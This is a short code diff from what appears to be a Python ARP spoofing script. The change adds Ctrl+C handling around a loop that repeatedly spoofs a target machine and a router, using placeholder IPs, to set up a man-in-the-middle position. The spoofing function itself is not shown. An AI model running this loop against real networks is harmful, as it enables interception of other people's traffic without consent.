@@ -54,16 +54,19 @@ def get_mac(ip):
 ##############################################################################
 # Main
 ##############################################################################
-while True:
-    spoof("insert target IP here", "insert router IP here")  # This spoofs the target
-    spoof("insert router IP here", "insert target IP here")  # This spoofs the router
-    sent_packets_count = sent_packets_count + 2
-    print("\r[+] Packets sent:" + str(sent_packets_count), end="")
+try:
+    while True:
+        spoof("insert target IP here", "insert router IP here")  # This spoofs the target
+        spoof("insert router IP here", "insert target IP here")  # This spoofs the router
+        sent_packets_count = sent_packets_count + 2
+        print("\r[+] Packets sent:" + str(sent_packets_count), end="")
 
-    # the line below flushes the standard output, telling python to print any
-    # statements to the same line; instead of printing to a new line.
-    # sys.stdout.flush()
-    time.sleep(2)
+        # the line below flushes the standard output, telling python to print any
+        # statements to the same line; instead of printing to a new line.
+        # sys.stdout.flush()
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("[+] CTRL + C Pressed.....Quitting Application.")
 
 ##############################################################################
 # End
